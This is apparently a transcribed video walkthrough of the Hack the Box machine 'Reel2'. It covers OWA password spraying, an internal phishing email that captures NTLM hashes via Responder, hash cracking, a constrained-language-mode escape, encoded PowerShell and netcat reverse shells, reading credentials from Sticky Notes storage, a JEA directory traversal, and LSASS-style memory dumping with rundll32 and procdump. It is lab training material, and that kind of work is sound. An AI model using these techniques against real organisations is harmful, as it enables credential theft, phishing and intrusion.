 what's going on youtube this is ipsec we're doing reel 2 from hack the box which was a super fun box just like its predecessor and it involves some type of fishing but it doesn't start off with fishing it starts off with you finding an owa instance but there's nothing really you can do further poking at the box reveals port 8080 which is running like a social media application use that to harvest a bunch of usernames to do a cadential spray against owa and you get in with the password of summer 2020. once on the box you can spray all the users of the domain with a link one of them clicks it and if you have responder or metasploit set up to forward the http to ntlm authentication you can get a net ntlm v2 hash once you crack that you have win rm access to the box but you're in constrained language mode so you do a super simple breakout of constrained language perk around the box find credentials to a jea which i think is just enough access account and that also has winrm but it is in no language mode which is different than constrained you can't easily break out of it but you can abuse one of the pre-built functions that has a directory traversal vulnerability to access uh the root.text so with that being said let's just jump in as always we're going to begin with the nmap so dash sc for default scripts sv enumerate versions oh a output all formats put in the nmap directory if there was one and then we'll call it real two and the ip address of 10 10 10 to 10 and i'm going to specify dash v so it shows me open ports as it finds them and i really thought i had nmap ran first i've done this box before but my prep for this box has been minimal because it is friday at 3 o'clock this video goes live in under 24 hours so no pressure um right off the bat we see 80 443 and 80 80. so let's go to a web browser and check out 10 10 10 to 10 and see what this box is we get a 403 forbidden let's take a look at https so 10 10 10 210 and we get a certificate error i always love looking at certificates so we can look at view certificate and the main thing i want to look for oh right here alternative names so we get dns names of reel2 and rio2.htb.local so let's go add those to our host file in case it needs that so 10 10 10 210 and we'll put both of those there so now what i'm going to do is go back to http and try real to uh did i mean to go to http yes i did 403 forbidden uh wait whoops i'm not mean https uh http real2.htb.local is that going to load i put in both it's not case sensitive ping what is my vpn down ping rail2 uh something happened it's not what i like seeing when i have very little time to do this video left 10 10 10 to 10. let's try ping 10 10 14 1 okay 10 10 10 2 the gateway is up 210 i can ping the box and i see the ttl of 127. so this is most likely going to be a windows box if you couldn't tell if it was 63 i know it'd be linux generally between um 65 and 128 i assume windows if it's below 65 like 64 and below i assume linux so uh let's see real two okay so everything's working i'm not sure exactly what that glitch was probably my internet connection or something so uh i'm just gonna run nmap again in case something died in the middle of nmap scanning so we got real to let's try hdb.local and again for three access forbidden so what i'm going to do is start a go buster so maker go buster and we'll do go buster directory mode dash u for url hdb 10 10 10 210 word list user share word list um actually i like set list opt set list uh discovery web content raph small words and because this is a windows box i'm going to do dash lowercase um the reason why i care about windows being lowercase is windows isn't a case sensitive operating system so not like doing a word list that mixes the casing is just like hitting the same url twice and just takes more time okay so we got url word list we need out part so go buster we'll call this http dash root.log and the extensions i'm not going to specify any because it's just access denied so um let's see world card everything's 403 let's see uh let's do go buster dash h of course directory mode dash h and we want status code let's just say 200 or uh 302 those are the two things we want or 301 okay so essentially we just change the status codes for go buster because we don't care about all these 403 denieds and 200 is okay and 301 302 are redirects um yeah so while that goes let's now go through the certificate see if 443 is a different page uh we just get a blank a um like windows iis page so we can do a second go buster so go buster directory mode dash u uh let's just copy all this so copy up to dasho okay we'll call this https root.log and with specify https and since this one isn't doing that weird like um access for bender on every page i'm going to specify asp and aspx this is going to take a little bit longer to do the go buster and the only reason i'm specifying two extensions to try with every file in this is because i'm doing a lowercase file list um we can see the difference of words or lines in both of these uh certificate error i think it follows curl syntax which is dash k and we did get a hit already owa on 301 so that is a redirect um what i was saying let's see wc-l on lower case that is 38 000 lines if we take out the lower case it's probably 50 000 or something 43 so in this word list and specific it doesn't save that much if i did this before i ran go buster probably wouldn't specify two extensions but oh well so we know there's owa if we go to 10 10 10 210 owa we get it forbidden but i bet if we do https it allows us that's where that it's forbidden but owa probably redirected to slash yeah this is actually funny behavior um if we curl dash v to show the header uh the owa is giving us a 301 redirect and it's redirecting us to owa slash and then giving us a 4 3 forbidden it's probably just because owa which is outlook web access i think it doesn't like plain text so if we go to owa on this me get a page i assume uh ping 10 10 10 210 okay i don't know why it's not working oh there we go uh outlook web app so uh we don't have username password for this so let's check out what that third port was uh 8080 210 8080 and we get a welcome to wall stand um i'm gonna go into the source code and see if we can see what cms or something this is and i don't really see anything there the next thing is googling uh walt stant and see what it is open source php social network so we can probably look at like search point wall stand to see if there's exploits it doesn't look like there are wall stand exploit on google uh wall stant i'm not really seeing many i'm sure there are exploits for this but let's just take a look uh we can try admin password to try login a username or email doesn't exist we can do a forgot password and check this out uh no we can't uh it doesn't work if you look at the link in the bottom left it just goes to a hashtag so that link doesn't work let's try sign up first name ip username sec or ipsec we can do email root ipsec.rocks password of you guessed it password i know you were going to think i typed please subscribe but sometimes i typo that so it's much easier to do password so we create an account and we log in now looking at this there are two things that match up we have access to a social network which looks like a old version of facebook and outlook so i'm guessing this is some type of os int challenge where we have to get user names and then go to outlook now there's one thing i don't like about this box and i think it's going to be how this is configured but we'll get to that now i guess i was going to say in a second but let's just go on a outlook grant right now of a bunch of knowledge so looking at this visually i know this is um exchange 2010. if you googled like um owa 2003 and go to image search you can see what owa 2003 looked like uh 2008 we can see maybe if we specify login you can see this one's blue 2010 we can see this looks like it matches exactly what we have i think i don't think there's a 2012 but maybe uh 2013 is it so in 2013 that's when it switched to this look and then 2016 i don't think it changed much from 2013. um and then i think there's probably a 2019 but yeah very subtle differences until once you get past 2013 but 2010 i should say but we know this is outlook 2010. now the one thing i don't like about this is if we use metasploit we should be able to enumerate valid usernames uh there is a um what is it like uh shoot like a time-based delay on valid accounts that is actually detectable i don't think it works on this box i'm not positive but because active directory is installed on the same box exchanges so how i think this script works and where the vulnerability is is exchange knows all the valid user accounts because it has a list of the mailboxes so when you try logging into owa with an account that doesn't have a mailbox it immediately just says access denied when you specify a username that does have an active mailbox it goes in queries active directory for the password because it knows it's a valid user and if it's an invalid password it says the same access denied message but because upon a valid user account when it goes over to ad you're creating a time delay and that's how i think scripts identify if it's a valid account or not i'm not sure why microsoft just doesn't make like every account go to ad to break that time delay but yeah um i'm assuming that's it it could also just be because of the configuration hack the box uses to have it like not specked out i think this box has like four or eight gigs of ram and most exchange boxes need like 32 or 64 gigs so it could be related to just like the machine not having the specs it needs but my assumption would be it's because of how 80 is installed and on this box since ad is installed locally there's really no delay when it detects oh this is a valid mailbox let me query ad it's all local it's instant so there's not much of a difference uh i said a lot there uh hopefully it made sense but i'm gonna use owa login and we can show options and i'm going to do something let's do v users let's see administrator guest ipsec does not exist so what i want to do is have it say administrator is a valid account or a guest sometimes they rename administrator that's why i do both administrator and guest but this just validates that our user enumeration is working so we can say set user file user i think is what i called it um set user file user set password please subscribe uh set our host 10 10 10 to 10 and we can run uh one more options fail to validate uh pwd ipsec reel2 what file is this users there we go run and there's two things um we see it's testing version owa 2013. so i'm gonna do show options and we got this auxiliary action um maybe i can do show action um search action it's probably not gonna be it i don't know how to list all the actions actually um how i found this is i grab this module go to the source code of it uh metasploit here we go and i search awa 2013 and i can see all of these so inbox check is right here so we're going to do rwa 2010. so if i go back here and we can set action owa 2010 i think we do invalid action it also tells me but now we run it yeah i need casing so capital owa so if you didn't look at the source and you just change action it would tell you which ones you can do we go to run it and we still get this error it's a ssl connect error so what we can do is show options and look at ssl it is set to true uh let's see maybe show advanced options to get us a little bit more so here's all this and there is this ssl version so what i'm going to do is curl dash k v https 10 10 10 210 and hope curl tells me what version of ssl i can use um what is taking so long do i have two open vpns running psef grab openvpn i do not okay um oh i don't have a colon there we go dls handshake failed so ssl is not working here um obviously a browser works so a browser is doing whatever ssl this allows we could try viewing this more information uh tls one two it says so let's go back to our meta point and look at ssl version we can set tls 1.2 so set ssl version tls 1.2 run still get it let's do the good old brute force 1.1 still errors tls1 there we go so now it's saying everything is valid so username is valid for administrator guest ipsec and does not exist so we know we can't validate uh potential usernames which sucks because i would have loved to be able to do that uh we can see the login time let's see administrator is 4375 and does not exist is 438 so this account doesn't exist but still took longer than this request so there's really like no delay on identifying valid accounts so there's no way we can even do this um but if we do have a valid credential it will tell us so at least we got that going for us um let's now try to build a username list so we have a way to spray outlook we need a way to generate usernames so that's where this wall stand comes in and what i want to do is search for files on this so let's go back to our go busters um this one finished now let's just say um 8080 root and i think that's fine dot log uh wait what oh i didn't specify 8080 i did in the log file not the url so we got a list of things uh we got includes login js this slash search seems good so if we go over to slash search we have a bunch of things so what i'm going to assume just based upon like smith johnson thompson these look like potential last names i'm gonna assume maybe first name and then their username is their last name um taylor is a weird last name but i suppose it's possible and what we have to do is be able to get all these names out so let's go ctrl u at miller and let's see slash u miller so we got alt alex and then miller now i'm just trying to think of a good way we can write a script to parse this because this spans lines which is annoying um we could probably import in a beautiful soup in python and that would be quick if i knew all the beautiful soup syntax off the top of my head uh let's see this follow button does this have anything oh wait there we go p and this i think we can work with this and a ugly bash one liner so curl search now i'm just gonna grip for miller so we only work with this let's see can i do grep op cp like that and then space br is that going to show me alex see it's going to show me everything not just what's highlighted i'm sure there's a way i can do this regular expression um oh well uh let's do this and we'll stop it at span okay that's good now let's get rid of this gret miller and we will grab it on this user follow box scrap this a awesome we have a list of accounts so now what we can do is probably the ugliest thing we'll see here today said get rid of p okay said get rid of this uh shoot it doesn't like these single quotes oh god um style dot star question mark to that that did not work um let's see you can get up to style right what i can do is double quote and said so we can do single quotes easily yes we can awesome so that works like this and let's see i want to leave a space somewhere [Music] um we messed up somewhere maybe this space right here there we go and the last said to get rid of this and there's probably a hundred better ways to do this but sometimes it just comes down to using nasty one-liners uh there's a slash here so i gotta terminate that slash for the backslash and now we have a list of first name and last name uh user.lst there we go so if i get this that looks good now the next step is to take this list and convert it into valid usernames because right now we have a space separating first name and last name and that's almost never going to happen in a username so if this was a server where i could enumerate valid usernames from i probably would start with one user and then try a bunch of formats and then once i find the account structure how they generally do names i'd apply that one to a mall so i have a relatively small word list when it comes to users but because i can't enumerate what is a valid username i have to do it to all users so to create a list of usernames i'm going to go to github and i'm going to search username user name anarchy and we can pull this tool so if we go to op get clone pull this or clone it i guess uh cd username let's see is the requirements there is not oh this is ruby i think um less username anarchy yeah ruby so we can do username anarchy input file um hdb real2 user.list and we can select format i'm just going to specify first to make sure this works now we can do first then first dot last awesome and we can do just f for the first initial i think it says somewhere in here but let's do um first initial last name because that's also common like f dot sanders and sometimes they don't do a period so let's just do f last there we go so now we have for every username grabbing just the first name first name dot last name first initial dot last name and first initial last name uh let's output this to a file i'm gonna put user two dot list cat user 2. list there we go i'm always careful not to direct something into something i'm working with so if i cat user.list now uh lst wait uh i guess that would have worked because i'm doing it to a different file but by cat hdb real to user.lst and then pipe that into itself um it deletes itself so if i cut that yeah so that's why i always choose different output names just in case we have a scenario like that but we can copy user2.txt to htb reel2 user.list and now we can go back into metasploit uh where is it do i have it open i do right here so set user file user.lst and we can run and it's gonna try please subscribe with all the usernames um please subscribe it's probably not gonna be a password so what i'm gonna do is go through all the seasons because that's a super common schema so set password we'll say summer 2020 run and if you want a fun story of this if you go to twitter.com ipsec and maybe i'll pin the tweet i may remove my ipsec.rocks tweet but i do if you search for it let's see what day it was um it's a super long thread but it's fun read of something i did a few days ago of a pen test and just live tweeted the actions as you can see there's a lot but if you search for it on march 9th of my twitter it's a fun read and here i am trying essentially the same thing i add a exclamation point because of password complexity policy or requiring a symbol normally but on this box when i did it it did not have a symbol at the end so always try um this like season and then year and you'll be surprised how often it works and it's only like if you do season year and season year exclamation point it's really not that many passwords to try brute forcing with considering accounts will generally lock out after at minimum four times normally so you can normally go through um this in like three or four hours because you don't want to try too many so i normally try two at a time and then separate it by 30 minutes a piece so i try all the accounts once and uh all the accounts i put two invalid attempts wait 30 minutes do it again and depending on how many user accounts you actually have you may not have to wait you may be able to start it up again because it may take over 30 minutes to go through so i'm going to try another season autumn 2020 and then run this again and then after autumn you guessed it i do spring and um winter but let's just run through this and i'm gonna speed the video up so we don't spend this time waiting and as this ran um [Music] i actually think we may have a valid one it was summer 2020 i thought it was autumn s dot s then summer 2020 weird i think this is valid but failed login um we may try a different toolkit if i try to log in with this so summer 2020 is on let's try htb this i wonder why i could fail see logging in it's taking a sweet time yeah that's a valid password um i'm not sure why that says failed s u i copied this i didn't type it um set or let's unset uh user file and set username s dot svenson set password summer 2020. set action awa 2013 run okay something is busted with that owa 2010 um wait eddie way 2013 login yeah so i don't know what we screwed up but it was screwed up marvelously um by changing our default to uh 2010 which is what we assumed the banner was it failed uh yeah so i guess lesson learned use 2013 even if it's a 2010 or wa instance um actually bizarre unset uh username set user file user.list run and we can run through all these and if you didn't want to use metasploit i generally recommend it um i normally don't run into that issue but i don't see or do owa 2010 too often anymore but we can see it was valid i think i'm going to stop this since we can let's see s yeah successful login you could have this stop upon successful login or at the end you could type creds but if i do um it's going to dump much of credits that i have a messpoi that i don't feel like showing to the screen so at home type in creds and any time you like gather a credit metasploit if it says like save into creds it's probably in a database somewhere which is one of the cool things about metasploit is it will do some of the like critical logging for you but um if you use the same machine for multiple purposes you may um unintentionally show things to your screen that you did not think were saved so i don't want to run the creds but that lesson learned the other thing you could do is go to um spraying tool kit and use this a python script that also works pretty well so if we get clone this go into spring toolkit python 3 atomizer do i have everything i do so this will spray link owa and imap so we can do owa the target 10 10 10 210 um the password let's do summer 2010 the user file um let's do hdb real to user.lst and it's going to do essentially the same thing as the owa and try to brute force the user um i may have to specify https i can't remember i need the full url or not see what is example does it give like slash owa link owa um yeah so it gives the full path so we can do that oh looks like it worked starting spray yeah so it found it it automatically did https found the domain name and now it's spraying and let's see s svenson oh i have some of 2010 summer 20 20. i had 2010 in my mind because of um i wonder if we just give it the auto discovery url if it's much quicker nine python three okay let's give it this but yeah in my head i had 2010 because of owa i wonder if i made that mistake anywhere else uh that we can just pass by reel 2 there we go so much quicker if you specify that auto discover url and um trying to stop it i can't but you saw it did it and it dumped account to valid accounts so both scripts work choose whatever one you like um me personally i generally used uh metasploit because that's what i'm used to but the spring toolkit looks like it's pretty good you can count this account at the end and see it um it printed multiple because i did control c but bird scripts work pretty amazingly so with access to owa um we can do the next step so let's close all these windows and we can see how wa is uh is that german or i don't know what language that says uh google translate and i'm gonna specify nift neat welsh so um yeah this next part can be me fumbling around and trying to remember the path on old outlook the first thing i go to when i have a domain user is i generally read messages or try to go through deleted messages maybe this is deleted i don't know what i just did but um no but i'd go through like delete messages see if i can recover any items and if i can maybe this one's recover uh let's see are there any and just kind of gain a feel for the land and in this case i don't see anything so i don't know what i'm supposed to do with this account but i'm going to guess fish so let's send an email and exchange has this thing called the um global address book that will let us send emails to users um i wonder if i can just do like all users and check um can i do like domain users check nope um we click on this user completer uh the book is this gonna open the gal for us there's a way we can open the global address book um maybe this there we go so we can dump all the users it looks like there's multiple formats for names like bob is bob uh we had some like yeah james jea test account uh weird savannah's fan at hack the box oh well um looks like the account name is different than the username but we can just right click this maybe copy ctrl c what does this do uh no i don't want to open like 100 windows mail there we go so that's a way we can potentially email all the accounts because i think that got everyone and we can send them a message um maybe i should like convert something to welsh um google translate and this part definitely not needed um hello please uh validate remote access by going here we will record your ip address and our ip is 10 10 14 4 i think and we can change this to this ah it's always important when you do a fishing to try to blend in see what's protocol uh remote access this is probably why like all the spammers in your mailbox just have horrible language because they do things like this but in their language to english so i bet anyone that can actually understand this language is gonna laugh at how bad my phishing email is but i assure you if i wrote one in english it would be good uh send the message and what we forgot to do nclvmp80 pseudo we may want to send that message again if it's like instantaneously inbox we got some undeliverables i think uh let's do sent no it deleted itself um hey we got a connection back so user agent uh windows powershell but we know someone is going to this link now in windows land you can redirect them and grab a smb hash so if i do responder uh pseudoresponder dash i ton zero we can see http options it's not serving an executable but it is starting a http server and when someone goes to this http server curl localhost uh what 12701 maybe i need to do this with pseudo i did do a pseudo this should be listing on port 80. ss lntp let's see tun zero oh it's listening on tons zero port 80. uh can i hit that 10 10 14 4 80 v uh let's see i wonder if it's doing something by um user agent so oh there we go it's asking us to authenticate via ntlm and when it does that it directs us and gives an ntlm hash of the user that's logged in so that is what this attack is so let's go back to uh this address book and we can click on everyone send a message to all and i'm not gonna be as creative i don't feel like translating that again so we send this and we'll see if anyone clicks and um metasploit also has the option to do it so i guess while this looks um search http this is going to give me so much um maybe it's cred see word unc injector oh wow there is a lot it's probably gonna be an auxiliary module which will be near the top uh let's see search auxiliary can i just do i guess i have to do use auxiliary and we can go through the directories uh there's a lot auxiliary gather 112 http pdf authors smb crud wow there's a lot no one hit my link yet i wonder if i'd specify more information firefox prevented 38 pop-up windows send this protocol a please click the link 10 10 14 4. i think that's what i sent last time it should be listening to go let's see metasploit http password gather run post windows i don't think that's it that's an arp scanner auxiliary authentication capture smb maybe this is it server capture let's see what this is in here ah we got a hash awesome um i just want to look at this real quick use oh i've used twice capture http show options and i think this will be similar http and tlm show options so yeah this does something similar to what we just did with the responder so you can always check out these metasploit options um metasploit is a lot more powerful than people give it credit for because people like avoiding metasploit for whatever reason but now we can try cracking this hash so i'm gonna do v hashes real to we'll paste this in and this is does it tell us and helium v2 so if we do hash cat hash examples is it example hashes yeah less antillem v2 it is mode 5600 so you can do dot slash hash cat m 5600 hashes real to upped wordlist rocky.text and we should see if it will give us a result looks like it does the screen scrolled pretty quickly we can go up and see the password is kittycat1 or you can just get rid of the word list and do dash dash show and it will show you the hash so we got k dot svensen as kitty cat one so now we have to figure out how to use this um we could potentially log into his mailbox now uh let's get rid of these 39 pop-up windows uh we're in s dots vinson i wonder who k is uh how do i log out uh yeah to close all browser windows okay do slash owa and we can check his account out copy kitty cat one we log in we look all around and we don't see anything even in this deleted so that's kind of a dead end um if we go back to our nmap so let's go in nmap less real2.nmap see what ports are open we don't have 445. um what's odd i guess because the like top 1000 ports doesn't get updated that much is nmap doesn't scan for winrm which is port like 59 85 and 59.86 i want to say so let's just check if that's open pseudo and map 10 10 10 to 10 59 85 and 50. let's just do 85 to 6000 and v dash n uh show me open ports as it finds it and dash and won't do dns we could have also done dash open which would hide these filtereds but um we have windows remoting so we can do evil winrm dash u uh yeah u for username all right was k dot svenson dash p for password kitty cat one and dash i for ip 10 10 10 210 and we're going to do evo win rm and we see it looks like it works but we're getting like invoke expression is not recognized name of a commandlet if we try anything like who am i or something um it just fails so i'm gonna do exit and i'm going to put a bad password in and see if it says authentication failed i'm assuming it will which tells us we were good just evil when our m didn't work and it's probably because it loves doing this invoke expression and maybe it's in like a constrained language mode or something's flagging and stopping us from using invoke expression um it's not even getting a shell now with this bad password um i'd expect it to yeah there we go authorization failure so we know we have a valid account but we just don't have a way to really use it with this so what we're going to do is some powershell on linux because now we can get like a remote session without depending on invoke expression from evil winner m uh we could look at it to see if it has like a flag to not do invoke expression like a basic winrm but i don't see it so what we want to do is pwsh to enter powershell on linux if i have too many problems i may want to try upgrading but uh can take some time so i don't feel like doing it i also want to get out of my map directory the annoying thing whenever you do powershell remoting is it doesn't like passwords and plain text so you kind of just memorize how to create a secure string so pass is equal to that secure string kitty cat one as plain text force and then we can create the credential object by doing new object system management automation ps credential htb slash k dot svenson and then give it the pass so now we got our credential object so we should be able to enter ps session computer 10 10 10 210 dash credential cred and we get access denied if we did this on windows i don't think we would uh what i generally would do is like google um powershell remote linux to windows i think and we get a lot of these like ssh things so i'm going to say minus ssh to say hide results that say ssh because we don't want to use ssh and let's see we have this quick breach uh a github issue and this thomas blog let's go look at this real quick uh this is talking about like how to set up windows because i don't think we have like these when rm uh this is using docker this this is probably the correct way to do it but it's going in a lot of stuff i don't want to use that uh this is an issue but this is a super good blog post um it goes into like how to install powershell uh various error messages you may get right now we have a connection denied with ntlm uh use this and authenticate authentication negotiate and it says sometimes it won't be necessary from a windows client and here's the like github issue from linux so let's add this and we get this weird error message with gss failure and above it it's talking about um installing this package so we can install it and once this is installed we should be able to powershell remote so go through and it takes its sweet time but eventually i think it will give us a session as long as we didn't typo anything in the cred there we go so now we have a powershell session we can do like who am i and let it finish the command and it's probably going to tell us um something does not work not recognize command or commandlet uh what we can do is look at like env username and look through our environment to get a username if we wanted to of course um we should know who we are oh is it colon username env colon username there we go yeah k svenson so we can dig through the environment if we want if we do gci uh env colon star is this going to dump every environment variable come on get back uh gci is not recognized gci should be so what we can look at is our execution context like oe and constrain language mode context session state language mode and we see we are in constrained language so we have very limited commands we can use um actually we it's a lie we don't uh you can escape constrained language mode but if you ran git commands you can see the commands you have natively but there's also um is it get command it's not commands yeah these are commands we should be able to use at least in constrained language mode however if we go to microsoft's site and just do like about constrained language mode there is a way to escape it uh here we go it enables us to like just create a function and then do things which is funny uh all powershell elements of powershell scripting are permitted whatever there is a new language mode that we'll see a bit later on in this box that is a bit more restrictive but since all objects and the scripting are enabled if we instead of just doing who am i if we create a function and do who am i it works it's super silly um if i wait for my command line to get back uh function test who am i and now we defined a function for us to use we should be able just to run test and who am i will work so we can abuse this to get a reverse shell as powershell that's not in this mode so let's do that i'm going to copy user share niching and let's do shells invoke powershell tcp undo oneline.ps1 because i'll make this as simple as possible or not as simple as small as possible and i don't feel like typing this invoke thing all the time so i'm going to call it rev.ps1 so let's edit rev.ps1 and we have two options um i generally always favor shorter options first when doing things in command line because sometimes you have a max number of characters you can do so let's try this first one get rid of this ip we are 10 10 14 4 and we want 9001 the other thing i want to show is we don't actually have to do function test we can just do shorthand i think this will work it's just going to create the function and run it and one thing so just a bit simpler so i'm going to cat rev.ps1 and then to make it compatible with powershell we have to convert it to uh icon t for target or two everyone remember that utf-16 little endian because that's the format windows likes and the main difference is if we do xxd here you can see everything is just one byte when we run this i convert command everything becomes two bytes and that's how powershell likes it just a weird oddity but you get used to it so we have this converted suppose there's no equals let's try running this i'm just going to make sure this is what i think it is 9001 should be fine so now let's do how i did before powershell enc for encoded command and we run it and we get a shell we do who am i case vinson uh oh maybe maybe i don't like this shell um i'm not a fan of like how this is working maybe if i do rl wrap beforehand read line wrap is that gonna work better uh let's go up copy paste one on separate lines that is annoying to have the up arrow in this shell come on i hit enter too many times this slowness okay i had the up arrow i could just type up sometimes it's always simpler who am i yeah i don't like how this is like the shell is janky to say the least so let's go and copy that other this thing back and do the other one so let's do this top shell and instead of this ip we can do 10 10 14 4. port 9001 base64 yep and let's try this so copy powershell enc like that nc lvmp 9001 run this again and who am i this looks like a much much better shell um i can't uh do like ctrl l to clear screen so i'm going to try rl wrap to see if i can get that working if not it's not the end of the world i just like having that functionality hey i think that's how it works i think that fixed it who am i yep awesome so now we have a normal shell in the box that we can run any powershell command we want which is awesome so let's take a look around looking in documents we have this jea test account and back when we did like that gal thing the global address list we did see something about jea test we can do net user jea test account and see information about it is a member of domain users but we can in fact see it exist it has a psrc which um is like the init for an account like initialization rc i think generally stands for run command like run command soon as you log in we can type it out to see what it is it's a bit painful to read with all these comments so what we can do is say [Music] select string dash not match and say if it begins with a comment and then we want to select string on period to grab only lines so this is a bit easier we can see cube created this and it's got a function which is check file and it's going to make sure check file exist in d colon or path of sql and program data so this is when i'm going to try changing directories to d and i can't so i guess this may come in later if we look at the other one the instead of psrc it was sc um this is i forget what sc stands for but it's defining the configuration maybe like shell configuration we can see it's applying the role capability jea test account to that account and i'd assume this account is in no language mode and this is the only command it can run so this is probably defining the role for jea test account and jea test account can run these functions which is only check file and yeah but the issue is we don't have jea test accounts password so we can't really even use this yet if we go on to the desktop to go grab user.txt we see some interesting things we see process explorer 64 sticky notes sysmon user.txt we can grab the user flag if we wanted to at this point but the sticky notes is interesting um sticky notes i think maybe we can pull the picture of it we copy go here google sticky notes image it puts like sticky net uh windows program puts like sticky notes on your desktop so we can probably use process explorer if we look at task list maybe like get task would have been better um maybe get task list set get tasker to get task list direct get task list powershell list processes get process we can see that sticky notes is running and i think we could probably use process explorer to dump the sticky notes um memory or we can use like run dll32 to dump it see handle id so here are all the ids of sticky notes um instead of dumping it maybe we'll do that at the end of the video if i can remember the command i learned a command doing analysis on like people hacking exchange and they used a run dll command to dump the process of lsas i thought it was pretty interesting but i don't have it i'll stop my head yet because i just learned it like two days ago so um yeah we go into app data which is where application data is generally stored we can look at each of these folders um we got sticky notes updater local low and dir roaming we got just the sticky notes so if we go into the sticky notes app data is where like application data is going to be stored and it's under the user so it's stored under that user um the roaming directory is when the user logs into a different computer it's his like profile roaming and it copies this directory to the new computer as well so he has the same thing across multiple computers um if we go into let's see like local storage we have maybe local storage level db we have a pretty big log file if we look at it so if we type 003 we get a bunch of junk i think if we type z the star.log and we pipe it over to format hex we can get a hex dump of this file and if we look at the hex dump of the file we can see more of what it is um so this is a json blob and this is what's on the actual sticky note so we can see it's doing an html giving the color of the sticky note and rgb format red green blue by the color the text the site uh the height of the thing the width of the sticky note if it's deleted no so even the sticky note was deleted we could potentially retrieve it by going into this but there is a sticky note on this guy's desktop credentials for jea and here's the password so let's grab this and it began with an a i think it was a capital a it just banned lines so a whatever so i'm going to do is we'll try logging in with this account copy rename this window to uh is it k dot swenson and this will be jea so pwsh we gotta convert this pass so convert to secure string pipe the password in or paste it in as plain text force credential object is going to be new object system management automation ps credential hdb ja test account then the password just want to make sure my credential object's good and we can do enter ps session computer 10 10 10 210 credential cred uh authentication negotiate and we get access denied um and when using these constrained language modes are just enough privilege i think it's jea token that what we saw before you also have to specify the configuration name if you go and google like enter ps session and look at like the man pages you can see exactly what that is but if we assume the configuration names what was in the psrc file which was just jea test account we can try logging in with winrm and specify to use this profile for the account and i think it should let us in but now if we do the um was it execution context execution context dot session state language mood it should say no language uh it's not even supported um it doesn't say no language mode but the error message says the run space is in no language mode so we can only do what is defined if i do a git command we can see what commands are available and very very few um there is check file though if we go back to case benson so cd cd slash users k dot svenson documents and type this or a c uh we need select string no match like that and select i think i can just do strength period what type jea select string no match i'm not sure what's going on but let's just look at this script block so this is the check file um allowing the computer so it wants the path like either d colon backslash or c colon program data and then it does star so as long as our path has sequel and program data we should be good so it may have a lfi vulnerability so if we do check file c colon program data and we can try a file we know exists windows system 32 was it license.otf it's just a file i know always exist on windows it's the license agreement so we can verify we have um a directory traversal if we just try going to this file it's not going to work because the check file command the license is pretty big but uh actually to check file commands here it requires it being like that so if we go back to this program data we can do dot dot administrator desktop root.text does not exist administrator root our text does not exist let's try desktop oh i did program data and i need users there we go and we can get the flag this way i don't think there's a way to actually get his password or anything to log in and um get a shell so that's unfortunate but at least we got the root flag there was one thing i wanted to go back to and that was um dumping the memory so let's see if we can figure out that run dll command going back to my favorite resource google i'm just going to google run dll32 dump process and let's see this looks good i remember seeing this com svcs and the stuff so let's see proc dump native dll there we go this is the command we want so let's go back to ks vinson and it was get process and we have this command uh we can dump it to c colon users k svenson documents test dot dmp so this is running run dll it's going into this com probably commonservices.dll executing the minidump function taking the process id and dumping it to the file and we want the full dump so let's look at sticky and is that size cpu um let's just try 5732 let's try dumping each of these so 5732 did it dump was that did it work did not work huh um dir so getting rid of that dot slash executed it but we don't have permission to dump this process uh let's see let's just try each one of these but it may be something we just can't do without administrator so maybe this was a silly rabbit hole i brought us down diyar oh we got something that is that is juicy if we type test.dump um format hex select maybe get content test dot dump huh maybe want you to copy this file back to our box but before we do let's grab that other one 57.88 c we also wanted 61.24 six one two four test two dot dump diar so we got two dumps can't type either of them but we can probably copy it to a box uh let's do smb server sudo um maybe share pwd does this do it right i should make the smb and do it from there i always get it reversed if it's uh impact it's running where is in packet kill that so the port's free um i always get confused between directory name and path i think directory name comes first so we should be able to copy star.dump to 101014 for share okay dump successful ls what  let's do test.dmp 1010144 share test dedicated successfully but did not drop the file huh net use 10 10 14 oh let's do z colon 10 10 14 4 share see colin let's see i wonder what a good way to copy this is gonna be i'm really surprised i can't just type format hex this um oh no i was thinking we could just put it on a web server and download it it can't be that easy can it we probably don't have write access there dir slash xa mpp hd docs set it inet pub c cd slash dir x-a-m-p-p d-i-r nothing in this directory i guess i don't have permission i net pub can't do a dir there cdk dot svensen was it in desktop would i put it uh where was i i was in documents i wanted those a command that just periodically wiped documents cd backslash cd windows cd temp let's run this run dll command again come on 6124 dir type test2.dmp huh let's just try using ps drive so let's do new ps drive dash name uh we'll call it ipsec dash root this is going to be 10 10 14 4 share ps provider file system authenticated successfully i believe see if we get this back i don't know if that message is from okay it disconnected now we're gonna get our command back come on looks like we did cd ipsec hey i think we can right now echo task 2 please sub let's go into smb and we got a file so now we can copy see colon windows temp test.dump here is that what we named it lsmb i wonder this around yellow command is like not giving us access to the file oh we called it test2.dump here cp windows test2.dump that's still too fast watch dash n one ls so that's gonna apparently do a ls command up above so now we can do this and just send it directly to ipsec test2.dump still not working this is bizarre um unless you have netcat on this box uh locate nc64.exe i do have a copy of netcat so let's cp this to smb and nclvnp 9002 dot slash nc64.exe i think it dash e cmd 1010 14 four nine thousand four i think i did nine thousand four don't know why i did that nine thousand two five ten ten fourteen two do i get a shell okay now we have this shell um cd town type test2.dum access denied so it's creating this file and we don't have ownership over it um it's weird i wonder if we can take ownership cd users k dot cd let's go into videos maybe videos doesn't get cleared and let's run this dump command again on dll32 so the issue we're having before is apparently this powershell reverse shell is not displaying standard error so when we're trying to do things it just wasn't telling us there was an error i'm going to call this 6124.dmp so we do dir uh probably need to specify full or something there we go so if we type this access denied um we can probably take own so take own slash f test two dot dump or we just renamed it take own slash f six one two four dot dump access denied so i'm guessing only root or administrator can read this dump file when we do it this way um not exactly sure let's try putting process dump on this box so process dump sys internals proc dump download we can save it and then go in smb cp downloads proctdump.zip unzip it and we got it there net use z colon 10 10 14 4 share z z colon uh task list so now we should be able to get the sticky notes process id access denied awesome uh dir proc dump64.exe dash accept yola and where is pid see dash u serif pid let's see i just do proc dump and pid was it 6124 rockdump 64.exe except yola 6124 dump one initiated so this looks better i'm gonna try this run dll command again and output it to z colon maybe it just didn't like my like powershell directory but it's definitely um dumping we see 32 so we're actually getting it this way strings not much information has been gathered yet but slowly but surely it should dump information so i'm just gonna pause the video and we will resume hopefully when it's done the dump finished but it took 270 seconds but we have now a sticky notes dump that we can take a look at with the strings command and maybe xxd it and we don't really have any good information there's definitely no credentials in this one so let's go back to this and search for what get process do we have it here still here we go sticky notes so we were looking at what process did we do six one two four please uh where is it yeah six one two four so we may want to dump instead of six one two four five seven eight eight so let's go here uh dot slash proc dump 64.exe except yola eight 5788 and again this probably will take a while i don't know why it's so slow probably because it's writing over to the network uh this 